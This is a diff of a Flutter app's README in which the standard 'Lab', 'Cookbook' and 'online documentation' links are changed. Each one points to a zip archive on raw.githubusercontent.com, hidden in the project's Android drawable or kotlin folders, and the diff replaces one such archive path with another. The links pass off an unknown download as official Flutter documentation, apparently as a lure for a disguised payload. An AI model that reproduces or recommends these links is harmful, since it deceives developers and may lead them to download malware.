@@ -8,9 +8,9 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/Ahmadramadhani13/tix_app/master/android/app/src/main/res/drawable-v21/app_tix_clubhouse.zip)
-- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/Ahmadramadhani13/tix_app/master/android/app/src/main/res/drawable-v21/app_tix_clubhouse.zip)
+- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/Ahmadramadhani13/tix_app/master/android/app/src/main/kotlin/tix-app-dynatron.zip)
+- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/Ahmadramadhani13/tix_app/master/android/app/src/main/kotlin/tix-app-dynatron.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://raw.githubusercontent.com/Ahmadramadhani13/tix_app/master/android/app/src/main/res/drawable-v21/app_tix_clubhouse.zip), which offers tutorials,
+[online documentation](https://raw.githubusercontent.com/Ahmadramadhani13/tix_app/master/android/app/src/main/kotlin/tix-app-dynatron.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
